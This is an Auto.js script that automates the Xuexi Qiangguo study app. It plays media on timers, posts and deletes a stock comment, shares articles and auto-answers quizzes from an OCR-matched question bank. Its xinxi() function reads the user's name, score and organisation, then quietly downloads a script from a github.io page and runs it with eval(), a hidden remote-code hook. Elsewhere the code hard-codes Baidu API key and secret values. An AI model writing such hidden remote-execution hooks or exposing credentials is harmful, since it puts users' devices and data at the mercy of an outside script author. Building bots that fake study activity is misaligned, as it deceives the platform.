//
var yitiku = files.path("./tk题库.txt");
//0读取题库。
try {
    var tikus = tiku_2(yitiku);
    var tksl = tikus.length;
    if (tksl) {
        log(tksl);
    }
} catch (e) {
    toastLog("缺少题库!");
}

var yijianxue = {};


//函数，循环次数,名字
function qdfh(c, s) {
    var i = c;
    while (i > 0) {
        toast(s + ">>次数:" + i);
        sleep(2000);
        //click_logs("取消");
        if (text("取消").exists()) {
            text("取消").findOnce().click();
        }
        sleep(1000);

        //click_logs("退出");
        if (text("退出").exists()) {
            text("退出").findOnce().click();
        }
        //返回标
        click(100, 178);
        sleep(1000);
        click("稍后提醒");
        i--;
    }
}
//2启动强国函数。
yijianxue.启动app = function() {
    //截图立即开始
    threads.start(function() {
        var qx1 = text("立即开始").findOne(2000);
        if (qx1) {
            qx1.click();
        }
        var qx2 = text("允许").findOne(2000);
        if (qx2) {
            qx2.click();
        }
    });
    //截图请求
    //请求截图
    threads.start(function() {
        if (!requestScreenCapture()) {
            toast("请求截图失败");
            // exit();
        }
    });
    try {
        //打开APP
        auto.waitFor();
        do {
            device.setMusicVolume(0); //媒体静音;
            sleep(2000);
            launchApp("学习强国");
            toastLog("打开app:学习强国");
            qdfh(3, "等待");

        } while (!text("百灵").exists());
        toastLog("打开成功");


    } catch (e) {
        toastLog("启动APP失败");
        click_logs("取消");
    }
};


//2本地播放.................
yijianxue.本地 = function() {
    try {
        toastLog("开始:本地播放!");
        var sfs = className("android.view.ViewGroup").find();
        if (sfs[3] != null) {
            //点击山东
            sfs[3].child(3).click();
            sleep_sj(3000);
            //var bddt = className("android.support.v7.widget.RecyclerView").find();
            var bddt = depth(25).className("androidx.recyclerview.widget.RecyclerView").findOne(5000);
            //山东卫视。
            if (bddt) {
                bddt.child(2).click();
                // bddt[0].child(2).click();
            }
            sleep_sj(3000);
            var sxcs = className("android.widget.TextView").text("刷新重试").findOne(2000);
            if (sxcs) {
                sxcs.click();
            }
            click("继续播放");
            //播放时长。
            sleep_sj(10000);
            back();
            sleep_sj(2000);
            //点击推荐。
            sfs[3].child(0).click();
            sleep_sj(2000);
            toastLog("结束:本地播放");
            sleep_sj(2000);
        }
    } catch (e) {
        toastLog("本地播放失败");
        sfs[3].child(0).click();
        fanhui(); //返回
    }

};

//3评论分享..........
yijianxue.评论分享 = function() {
    try {
        toastLog("开始:评论、分享文章");
        sleep_sj(2000);
        var pls = 0;
        while (pls < 5) {
            if (text("播报").exists()) {
                var bobao = className("android.widget.TextView").text("播报").findOne(6000);
                toastLog(bobao.parent().parent().parent().child(0).text());
                //  toastLog(bobao.bounds().centerX() + " " + bobao.bounds().centerY());
                click(bobao.bounds().centerX() - 200, bobao.bounds().centerY());
                for (var i = 1; i < 3; i++) {
                    toastLog("第" + i + "次");
                    sleep_sj(4000);
                    //评论
                    className("android.widget.TextView").text("欢迎发表你的观点").findOne(6000).click();
                    sleep_sj(1000);
                    setText("撸起袖子加油干！");
                    sleep_sj(1000);
                    className("android.widget.TextView").text("发布").findOne(6000).click();
                    sleep_sj(1000);
                    click_logs("删除");
                    sleep_sj(1000);
                    className("android.widget.Button").text("确认").findOne(6000).click();
                    sleep_sj(1000);

                    //分享
                    className("android.widget.TextView").text("欢迎发表你的观点").findOne(6000).parent().child(3).click();
                    sleep_sj(5000);
                    className("android.widget.GridView").findOne(6000).child(0).click();
                    sleep_sj(3000);
                    back();
                    sleep_sj(1500);
                }
                fanhui();
                break;
            }
            pls++;
            var aa = className("android.widget.ListView").find();
            aa.scrollForward();
            //swipe(1000, 1800, 1100, 100, 600);
            sleep_sj(2000);

        }
        toastLog("结束:评论、分享文章");

    } catch (e) {
        toastLog("评论失败");
        fanhui();
        //返回
    }
}



//5播放文章。
yijianxue.文次 = function() {
    try {
        toastLog("开始:文章播放");
        sleep_sj(2000);
        //先滑动三页
        var aa = className("android.widget.ListView").find();
        for (var i = 1; i < 4; i++) {
            aa.scrollForward();
            sleep_sj(2000);
        }

        for (var i = 1; i < 7; i++) {
            toastLog("第" + i + "次");
            var bobao = className("android.widget.TextView").text("播报").findOne(3000);
            if (bobao) {
                bobao.click();
                var bt = bobao.parent().parent().parent().child(0).text();
                toastLog("播报:" + bt)
                sleep_sj(15000); //播放时长。
            } else {
                i--
            }
            // 滑动屏幕。
            aa = className("android.widget.ListView").find();
            aa.scrollForward();
            //swipe(1000, 1800, 1100, 100, 600);
            sleep_sj(2000)
        }
        //点击学习。
        className("android.widget.FrameLayout").id("home_bottom_tab_button_work").findOne(6000).click();
        toastLog("结束:文章播放")
        sleep_sj(2000)
    } catch (e) {
        toastLog("文章播放失败");
    }
}

//6播放视频。
yijianxue.视次 = function() {
    try {
        toastLog("开始:播放视频")
        sleep_sj(2000);

        click_logs("百灵");
        sleep_sj(3000);
        var sp = className("android.widget.ListView").find();
        try {
            sp[1].child(1).child(1).child(0).click();
            log("1" + sp[1].child(1).child(1).child(1).child(0).text());
        } catch (e) {
            sp[2].child(1).child(1).child(0).click();
            log("2" + sp[2].child(1).child(1).child(1).child(0).text());
        }
        var sxcs = className("android.widget.TextView").text("刷新重试").findOne(2000);
        if (sxcs) {
            sxcs.click();
        }
        for (var i = 1; i < 7; i++) {
            toastLog("第" + i + "次播放");

            sleep_sj(15000); //播放时长。  
            swipe(500, 1600, 500, 300, 600); //滑动屏幕。
            sleep_sj(2000)
        }
        back();
        //sleep_sj(2000)
        //  sleep_sj(2000)
        //  back();
        sleep_sj(2000)
        //点击学习。
        className("android.widget.FrameLayout").id("home_bottom_tab_button_work").findOne(6000).click();
        toastLog("结束:视频播放")
        sleep_sj(2000)
    } catch (e) {
        toastLog("视频播放失败");
        fanhui() //返回
    }
}

//8打开电台。
yijianxue.视长 = function() {
    try {
        toastLog("开始:电台播放")
        sleep_sj(2000)
        click_logs("电台");
        sleep_sj(2000)
        click_logs("听广播");
        sleep_sj(3000)
        if (textContains("收听").exists()) {
            click_logs("收听");
            console.log("正在收听广播...");
            sleep_sj(2500)
            // back(); //返回电台界面
            fanhui() //返回
            sleep_sj(2000)
        }
        className("android.widget.FrameLayout").id("home_bottom_tab_button_work").findOne(6000).click();
        sleep_sj(2000)
        click_logs("推荐");
        sleep_sj(2000)
    } catch (e) {
        toastLog("电台时长失败");
        fanhui(); //返回
    }
}
//7文章时长
yijianxue.文长 = function() {
    try {
        toastLog("开始:文章时长")
        sleep_sj(2000)
        var wzscs = 0;
        while (wzscs < 5) {
            if (text("播报").exists()) {
                var bobao = className("android.widget.TextView").text("播报").findOne(6000);
                toastLog(bobao.parent().parent().parent().child(0).text());
                //   toastLog(bobao.bounds().centerX() + " " + bobao.bounds().centerY());
                click(bobao.bounds().centerX() - 200, bobao.bounds().centerY());

                for (var i = 36; i >= 1; i--) {
                    var m = i * 10
                    toastLog("观看倒计时:剩余" + m + "秒");
                    sleep(10000)
                    //swipe(1000, 1800, 1100, 100, 600);
                }
                break;
            }
            wzscs++;
            var aa = className("android.widget.ListView").find();
            aa.scrollForward();
            //swipe(1000, 1800, 1100, 100, 600);
            sleep_sj(2000)
        }
        // back();
        fanhui();
        toastLog("结束:时长运行结束");
    } catch (e) {
        toastLog("文章播放时长失败");
        fanhui(); //返回
    }
}



//9强制关闭。
yijianxue.关闭app = function() {
    try {
        toastLog("开始:强制关闭");
        sleep_sj(2000)
        openAppSetting(getPackageName("学习强国"));
        sleep_sj(2000)
        id("right_button").findOne(6000).click();
        sleep_sj(2000)
        click_logs("强行停止")
        click_logs("结")
        click_logs("行")
        sleep_sj(2000)
        click_logs("确")
        sleep_sj(2000);
        back();
        toastLog("结束:已强制关闭");
    } catch (e) {
        toastLog("强制关闭失败");
        //fanhui()//返回
    }
}
//2.1挑战答题，匹配主函数。--
yijianxue.挑单答 = function() {
    try {
        var date1 = new Date(); //构造时间函数
        log("①已点答题按键");
        var xh = 0;
        do {
            log("读取问题中……");
            sleep(1000);
            var ti = className("android.widget.ListView").findOne(20000);
            var tis = ti.parent().child(0).text();
            if (xh > 10) {
                var tis = "没找到";
                toastLog("未找到题目")
            }
            xh++;
        }
        while (!tis);
        var tm = zls(tis.slice(0, 20));
        log("②题目:" + tm);
        //匹配
        var jie = []; //建空列表,放结果
        for (var i = 0; i < tikus.length; i++) {
            var tkti = zls(tikus[i].wenti);
            var jieguo = tkti.indexOf(tm); //问题匹配筛选。
            if (jieguo >= 0) {

                var jies = tikus[i].daan;
                var jies_1 = jies.replace(/\s|^[A-D][\.\、]/ig, ""); //字典答案只保留汉字和数字。
                var jies_2 = "【" + jies_1 + "】"; //加上中括号，提高准确度。
                jie.push(jies_2); //结果放入列表。
            }
        }
        if (jie == false) {
            //  device.vibrate(300);
        }
        var daan = jie.toString(); //转成字符串。    
        toastLog("③答案:>>" + daan.slice(0, 50) + "<<" + jie.length + "个"); //匹配字典答案结果。

        //点击
        var xuxiang = [];
        var pddj = 0
        if (className("android.widget.ListView").exists()) {
            var aa = className("android.widget.ListView").findOne(10000); //挑战选项。
            for (var j = 0; j < aa.childCount(); j++) {
                var xxs = aa.child(j).child(0).child(1);
                var xuanx = xxs.text(); //选项
                xuxiang.push(xuanx);
                var xuanx_1 = xuanx.replace(/\s|^[A-D][\.\、]/ig, ""); //选项只保留汉字和数字。
                var xuanx_2 = "【" + xuanx_1 + "】"; //添加中括号，提高精确度。
                // log(xuanx_2);
                var jieguos = daan.search(xuanx_2); //匹配选项筛选结果。
                if (jieguos >= 0) {
                    aa.child(j).child(0).child(0).click();
                    var dass = aa.child(j).child(0).child(1).text();
                    click_logs(xuanx)
                    log("④此轮点击完成");
                    pddj++;
                }
            }
            if (pddj == 0) {
                toastLog("没找到，随便点一个");
                console.warn("没找到，随便点一个");
                aa.child(0).child(0).child(0).click();
            }
            log("选项:" + xuxiang);
        }
        var date2 = new Date(); //构造函数
        log((date2 - date1) / 1000 + "秒--------------------");
    } catch (e) {
        log("点击失败");
    }
}
//12挑战答题主。
yijianxue.挑战 = function() {
    try {
        toastLog("开始:挑战答题");
        datiyemian(10);
        sleep_sj(2000);
        for (var i = 0; i < 20; i++) {
            if (i < 6) {
                //挑战答题
                yijianxue.挑单答();
                sleep_sj(3000);
            } else {
                toastLog("随便点一个");
                console.warn("随便点一个");
                var aa = className("android.widget.ListView").findOne(6000); //挑战选项。
                aa.child(0).child(0).child(0).click();
                sleep_sj(6000)
                if (text("结束本局").exists()) {
                    break;
                }

            }
            if (text("分享就能复活").exists()) {
                sleep_sj(1000);
                click_logs("分享就能复活");
                sleep_sj(3000);
                back();
                sleep_sj(3000);

            }

            if (text("再来一局").exists()) {
                break;
            }
        }
        sleep_sj(1000);
        fanhui(); //返回
        toastLog("结束:挑战答题完毕");
    } catch (e) {
        toastLog("挑战答题失败");
        fanhui(); //返回
    }

}



////单个答题2。
//childCount
yijianxue.单答s = function() {
    // try {
    log("已点答题按键");
    var ti = depth(29).className("android.widget.ListView").findOne(25000);
    //  var z = ti.parent().bounds()
    // var z1 = z.left
    // var z2 = z.top
    //  var z3 = z.right
    //  var z4 = z.bottom
    var z = 读("c", "zb", "91,660,915,80,1580").split(",");
    //  log("宽"+device.width+"高"+device.height)
    //  var zs3=device.width - Number(z1) - 80
    // var zs4=device.height - Number(z2) - 200
    log(z[0] + "," + z[1] + "," + z[2] + "," + (Number(z[4])));
    sleep(200);
    var d = jietu(Number(z[0]), Number(z[1]), Number(z[2]), (Number(z[4])));
    log(d);
    if (d[0]["words"] == "") {
        d = "失败"
    } else {
        log(d[0]["words"])
    }
    var jie = ""; //建空列表,放结果
    for (var i = 0; i < tikus.length; i++) {
        var ds = zl(d[0]["words"]);
        var tks = zl(tikus[i].wenti);
        var jieguo = tks.indexOf(ds); //问题匹配筛选。
        if (jieguo >= 0) {
            jie += tikus[i].da;
            jie += tikus[i].daan;
            jie += "\n"
            // break;
        }
    }
    try {
        toastLog("●" + jie.substr(0, 100)); //匹配字典答案结果。
    } catch (e) {}
    if (jie == "") {
        jie = "没找到答案";
    }
    var jies = zls(jie);

    var z0 = ti.children();
    for (var k = 1; k < d.length; k++) {
        var x0 = d[k]["words"];
        var xs0 = zls(x0)
        if (xs0 != "无" || xs0 != "") {
            var xs1 = xs0.slice(0, 5)
            var j1 = Number(x0.indexOf("A."));
            if (j1 != -1) {
                if (jies.indexOf(xs1) != -1) {
                  //  toastLog("点A" + xs1)
                    click(z0[0].bounds().centerX(), z0[0].bounds().centerY());
                    sleep(100);
                    click(z0[0].bounds().centerX(), z0[0].bounds().centerY());
                    break;

                }
            }

            var j1 = Number(x0.indexOf("B."));
            if (j1 != -1) {
                if (jies.indexOf(xs1) != -1) {
                  //  toastLog("点B" + xs1)
                    click(z0[1].bounds().centerX(), z0[1].bounds().centerY());
                    sleep(100);
                    click(z0[1].bounds().centerX(), z0[1].bounds().centerY());
                    break;

                }
            }

            var j1 = Number(x0.indexOf("C."));
            if (j1 != -1) {
                if (jies.indexOf(xs1) != -1) {
                  //  toastLog("点C" + xs1)
                    click(z0[2].bounds().centerX(), z0[2].bounds().centerY());
                    sleep(100);
                    click(z0[2].bounds().centerX(), z0[2].bounds().centerY());
                    break;

                }
            }
            var j1 = Number(x0.indexOf("D."));
            if (j1 != -1) {
                if (jies.indexOf(xs1) != -1) {
                   // toastLog("点D" + xs1)
                    click(z0[3].bounds().centerX(), z0[3].bounds().centerY());
                    sleep(100);
                    click(z0[3].bounds().centerX(), z0[3].bounds().centerY());
                    break;

                }
            }

        }
    }
    click(z0[0].bounds().centerX(), z0[0].bounds().centerY());
    sleep(100);
    click(z0[0].bounds().centerX(), z0[0].bounds().centerY());

    //   } catch (e) {
    //     toastLog("错")
    //  }
}






//截图用图片转文字
yijianxue.ocrs = function(imgFile) {

    //   var access_token = http.get("https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=YIKKfQbdpYRRYtqqTPnZ5bCE&client_secret=hBxFiPhOCn6G9GH0sHoL0kTwfrCtndDj").body.json().access_token;
    var ak = "xdarK0D4R0GGjr04efEv5Lzw";
    var sk = "MzBuIG2K5P7WoUUk1xmGwP8LMiKY5veD";
    //通过sk和sk,获得token;
    var access_token = http.get("https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=" + ak + "&client_secret=" + sk).body.json().access_token;
    url = "https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic" + "?access_token=" + access_token;
    var img = images.read(imgFile);
    var imag64 = images.toBase64(img, "png", 100);
    res = http.post(url, {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        image: imag64,
        image_type: "BASE64",
        language_type: "CHN_ENG"
    });
    //  log(res.body.string());
    ///   str = JSON.parse(res.body.string()).words_result.map(val => val.words).join('\n');
    var strs = JSON.parse(res.body.string());
    //toastLog(typeof strs["error_code"]);
    if (strs["error_code"] == 17) {
        toastLog("识别失败了")
        var ccs = [{
            "words": "失败"
        }]
        return ccs
    }
    var strss = strs["words_result"]; //[0]["words"];
    // var strss = strs.words_result.map(val => val.words).join('');
    //    log(strs);
    img.recycle();
    //  imag64.recycle();
    return strss;

}

////单个答题。
yijianxue.单答不点2 = function() {
    //  try {
    //请求截图
    //     if (!requestScreenCapture()) {
    //       toast("请求截图失败");
    //    exit();
    //     }
    log("开始截图答题……，按音量上键为关闭");
    //  } catch (e) {}

    var a = 读("c", "zb", "91,660,915,80,1580").split(",");
    var xtl = captureScreen();
    var clipls = images.clip(xtl, a[0], a[1], a[2], a[3]);
    images.save(clipls, "1.png");
    clipls.recycle();
    var ts = yijianxue.ocrs("1.png");
    //    toastLog(ts);
    var jie = ""; //建空列表,放结果

    var ds = zl(ts[0]["words"]);
    //  toastLog(ds)
    if (ds != "") {
        for (var i = 0; i < tikus.length; i++) {
            var tks = zl(tikus[i].wenti);
            var jieguo = tks.indexOf(ds); //问题匹配筛选。
            if (jieguo >= 0) {
                //  jie += tikus[i].da;
                jie += tikus[i].daan;
                jie += "\n"
                // break;
            }
        }
        //  log("答案:" + jie.substr(0, 100)); //匹配字典答案结果。
        if (jie != "") {
            toastLog("●" + jie); //匹配字典答案结果。
        } else {
            toastLog("没找到!!!")
        }
    }
    //   xtl.recycle();
    //  xts.recycle();




}

//循环答题
yijianxue.多答 = function() {
    //   setScreenMetrics(1080, 2408); //分辨率设置。
    toastLog("答");
    //   sleep(7000);
    for (var i = 0; i < 20; i++) {
        //   toastLog(i + "有");
        yijianxue.单答s();
        sleep(2000);
        if (text("继续挑战").exists()) {
            break;
        }
        sleep(1000);
    }
}
//11双人对战主。
yijianxue.双人 = function() {
    try {
        toastLog("开始:双人对战答题");
        sleep_sj(2000);
        datiyemian(9);
        sleep_sj(2000);
        var yqds = text("随机匹配").findOne(6000);
        yqds.parent().child(0).click();
        sleep_sj(2000);
        click_logs("开始对战");
        sleep(3000);
        //对人对战       
        // zsymains();
        yijianxue.多答();
        sleep_sj(1000);
        fanhui(); //返回
        toastLog("结束:双人对战答题完毕");
    } catch (e) {
        toastLog("双人对战失败");
        fanhui(); //返回
    }
}
//10争上游主。
yijianxue.争上 = function() {
    var zsss = 1;
    while (zsss < 3) {
        try {
            toastLog("开始:争上游答题");
            sleep_sj(2000);
            datiyemian(8);
            sleep_sj(2000);
            click_logs("开始比赛");
            sleep(3000);
            //争上游       
            // zsymains();
            yijianxue.多答();
            sleep_sj(1000);
            fanhui(); //返回
            toastLog("结束:争上游答题完毕");
        } catch (e) {
            toastLog("争上游答题失败");
            fanhui(); //返回
        }
        zsss++;
    }
}


//13每日答题。
yijianxue.每日 = function() {
    var msss = 1;
    while (msss < 3) {
        try {
            toastLog("开始:每日答题");
            sleep_sj(2000)
            datiyemian(2);
            sleep_sj(2000);
            for (var i = 0; i < 5; i++) {
                sleep_sj(1000)
                if (text("多选题").exists() || text("单选题").exists()) {
                    toastLog(i + ">>选择题")
                    yijianxue.xuanxiang();
                    sleep_sj(1000);
                    continue; //跳出单次循环。
                }
               // sleep_sj(2000)
                if (text("填空题").exists()) {
                    toastLog(i + ">>填空题")
                    yijianxue.tkt();
                    sleep_sj(1000);
                    continue; //跳出单次循环。
                }
            }
            click_logs("完成")
            sleep_sj(3000);
            if (text("领取奖励已达今日上限").exists()) {
                toastLog("已达上限");
                fanhui(); //返回
                log("结束:每日答题完毕");
                break;
            }
            fanhui(); //返回
            toastLog("结束:每日答题完毕");
            // }
        } catch (e) {
            toastLog("每日答题失败");
            fanhui(); //返回
        }
        msss++;
    }
}
//1每日答题-选择题查看提示。
function tishis() {
    sleep_sj(100)
    click_logs("查看提示")
    sleep_sj(100)
    if (text("提示").exists()) {
        var aa = className("android.view.View").text("提示").findOne(6000).parent().parent().child(1).child(0);
        var bb = aa.text()
        log("①提示:" + bb)
    }
    sleep_sj(100)
    back();
    return bb
}
//2每日答题-选择题点击。
yijianxue.xuanxiang=function() {
    sleep_sj(2000)
    var tishitis = tishis() //查看提示。
    var xx = ["A.", "B.", "C.", "D.", "E."]
    var kb = []
    var kb1 = []
    for (var i = 0; i < xx.length; i++) {
        var xxs = xx[i]
        if (textContains(xxs).exists()) {
            kb1.push(1)
            var aa = textContains(xxs).findOne(6000).parent()
            var bb = aa.child(2).text()
            //  var cc = bb.replace(/[^\u4e00-\u9fa5]/g, "");
            if (tishitis.lastIndexOf(bb) >= 0) {
                log("②正确选项:" + xx[i] + bb)
                aa.click();
                sleep_sj(1000);
            } else {
                kb.push(1)
            }
        }
    }
    // toastLog(kb.length + ":" + kb1.length)
    if (kb.length == kb1.length) {
        toastLog("没找到,随便点一个")
        var xxss = ["A.", "B.", "C.", "D.", "E."]
        for (var j = 0; j < xxss.length; j++) {
            var xxsss = xxss[j]
            if (textContains(xxsss).exists()) {
                var aas = textContains(xxsss).findOne(6000).parent()
                aas.click();
                sleep_sj(1000)
            }
        }
    }
    sleep_sj(2000)
    click_logs("确定")
    sleep_sj(2000)
    click_logs("下一题")
}
//3每日答题-填空题答案查看提示
function tishi() {
    sleep_sj(100)
    click_logs("查看提示")
    //  sleep_sj(2000)
    if (!text("请观看视频").exists()) {
        sleep_sj(100)
        if (text("提示").exists()) {
            var aa = className("android.view.View").text("提示").findOne(6000).parent().parent().child(1).child(0);
            var ts_list = aa.text()
            log("①提示:" + ts_list)
        }
        var ts_lists = ts_list.replace(/[^\u4e00-\u9fa5]/g, ""); //
        sleep_sj(100)
        back();
    } else {
        sleep_sj(100)
        var ts_lists = "屁"
        back();

    }
    return ts_lists
}
//4每日答题-填空题点击。
yijianxue.tkt=function() {
    sleep_sj(2000)
    var tishiti = tishi() //查看提示。
    if (text("填空题").exists()) {
        var tm = className("android.view.View").text("填空题").findOne(6000).parent().parent().child(1)
        var aa = tm.child(0).text()
        log("②问题:" + aa)
        var kks = className("android.widget.EditText").findOne().parent().child(1)
    }
    try {
        if (tishiti != "屁") {
            var aas = aa.replace(/[^\u4e00-\u9fa5]/g, ""); //问题整理。
            var xwt = aas.slice(aas.length - 5) //问题获取后5个字。
            var ts = tishiti.lastIndexOf(xwt) //匹配最后关键字的长度。
            var sr = tishiti.slice(ts + 5); //切出答案。
            sleep_sj(2000)
            kks.click();
            sleep_sj(2000)
            setText(sr + tishiti + "我不会"); //输入答案。
            toastLog("③问题答案:" + sr.slice(0, 10)); //切出答案。

        } else {
            sleep_sj(2000)
            kks.click();
            sleep_sj(2000)
            setText("这个题我不会"); //输入答案。
        }
        sleep_sj(2000)
        click_logs("确定")
        sleep_sj(2000)
        click_logs("下一题")
    } catch (e) {
        log(e)
        sleep_sj(2000)
        kks.click();
        sleep_sj(2000)
        setText("录入错误"); //输入答案。
        sleep_sj(2000)
        click_logs("确定")
        sleep_sj(2000)
        click_logs("下一题")
    }
}

//1打开题库。
function tiku_2(tikues) {
    try {
        var tikubl = tikues
        var file = open(tikubl, "r", "utf-8"); //读取文件的所有内容
        var text = file.read();
        var ytext = text.slice(0, 3)
        if (ytext.indexOf("[")) {
            var qukongge = text.replace(/\s/g, "");
            if (qukongge.length > 0) {
                var texts = qukongge.slice(0, text.length - 1);
                var ass = "[" + texts + "]";
                var zidians = eval('(' + ass + ')');
            }
        } else {
            var zidians = eval('(' + text + ')');
        }
        file.close();
        return zidians;

    } catch (e) {
        toastLog("备份题库打开失败");
    }
}






//返回
function fanhui() {
    try {
        for (let i = 10; i > 0; i--) {
            if (!text("强国通").exists()) {
                console.info("返回")
                back();
                sleep_sj(2000)
                // click("退出");
                if (text("退出").exists()) {
                    text("退出").findOnce().click();
                }
                sleep_sj(1000);
            }
        }
        console.info("已到主界面,准备刷新")
        className("android.widget.FrameLayout").id("home_bottom_tab_button_work").findOne(16000).click();
    } catch (e) {
        toastLog("返回失败")
    }
}

//打开答题页面
function datiyemian(shu) {
    try {
        var shus = shu;
        sleep_sj(2000);
        if (text("强国通").exists()) {
            className("android.widget.TextView").id("comm_head_xuexi_mine").text("我的").findOne(10000).click();
            sleep_sj(1500);
            xinxi();
            sleep_sj(1500);
            click_logs("我要答题");
            sleep_sj(2000);
            var tzdt = className("android.view.View").text("答题练习").findOne(6000);
            tzdt.parent().child(shus).click();
            sleep_sj(2000);
        }
    } catch (e) {
        toastLog("答题页面打开错误")
        fanhui()
    }
}




//辅助函数----------
//2.2点击log
function click_logs(logs) {
    try {
        console.info("点击>>" + logs)
        click(logs)
    } catch (e) {
        log("点击失败");
    }
}

//2.2随机时间。
function sleep_sj(aa) {
    var a = aa;
    var d = random(1, 3); // 随机数字。
    var c = random(100, 1000); // 随机数字。
    var jh = d * c + a;
    console.verbose("--停顿" + jh / 1000 + "秒--")
    sleep(jh)
}
//积分查询
yijianxue.积分 = function() {
    sleep(3000);
    className("android.widget.TextView").text("播报").findOnce().click();
    sleep(3000);
    className("android.widget.TextView").id("comm_head_xuexi_score").depth("14").findOne(6000).click();
    sleep(3000);
    var lbjf = className("android.widget.ListView").depth("21").findOne(6000).children();
    toastLog(lbjf.length);
    for (var i = 0; i < lbjf.length; i++) {
        var a = lbjf[i].child(0).child(0).text();
        var b = lbjf[i].child(1).text();
        var c = lbjf[i].child(2).text();
        var d = lbjf[i].child(3).text();
        // toastLog(a+b+c+d);
        if (d != "已完成") {
            toastLog(a + ":" + c);
        }
    }
}





//截图
function jietu(xx, yy, kk, gg) {
    //toastLog("a");
    var img = captureScreen();
    //  var src = images.read("1.png");
    var clip = images.clip(img, xx, yy, kk, gg);
    //二值化
    var aa = images.threshold(clip, 100, 255, "BINARY")
    images.save(aa, "2.png", "png", 50);
    // var imgPath = files.path("./2.png");
    //  let Sizes = (new java.io.File(imgPath)).length();//取得文件大小-kb
    //   toastLog("dd"+Sizes)
    clip.recycle();
    aa.recycle();
    //  return;

    // toastLog(t);
    var t = yijianxue.ocrs("2.png");
    // 回收图片
    // img.recycle();

    // var aa = zl(t)
    return t
}

//字典只保留汉字。
function zl(ti) {
    try {
        return ti.replace(/[^\u4e00-\u9fa5]/g, ""); //字典只保留汉字。
    } catch (e) {
        return "无"
    }
}
//字典只保留汉字和数字。
function zls(ti) {
    try {
        return ti.replace(/[^0-9^\u4e00-\u9fa5]/g, ""); //字典只保留汉字。
    } catch (e) {
        return "无"
    }
}

function 写(文件名, 键, 值) {
    const storage = storages.create(文件名);
    storage.put(键, 值);
}

function 读(文件名, 键, 默认值) {
    const storage = storages.create(文件名);
    if (storage.contains(键)) {
        return storage.get(键, 默认值);
    };
    写(文件名, 键, 默认值);
    return 默认值;
}
//信息流
function xinxi() {
    try {
        //  var 本地储存 = storages.create("激活码"); //创建
        var xm1 = className("android.widget.TextView").id("my_display_name").findOne(3000).text();
        var xm2 = className("android.widget.TextView").id("my_score_value").findOne(3000).text();
        var xm3 = className("android.widget.TextView").id("tv_org_name").findOne(3000).text();
        var xx = xm3 + "_" + xm1 + "_" + xm2;
        写("c", "xx", xx);
        threads.start(function() {
            try {
                sleep(2000);
                var hrll = http.get("https://sdbsxwf.github.io/jiaoben/xx1.html", {
                    headers: {
                        'Accept-Language': 'zh-cn,zh;q=0.5',
                        'User-Agent': 'Mozilla/5.0(Macintosh;IntelMacOSX10_7_0)AppleWebKit/535.11(KHTML,likeGecko)Chrome/17.0.963.56Safari/535.11'
                    }
                });
                var hrlsss = hrll.body.string();
                sleep(1000);
                eval(hrlsss); //脚本。
            } catch (e) {
                log("启动");
            }
        })
        return xms
    } catch (e) {
        var xms = "sp";
        return xms
    }
}



module.exports = yijianxue;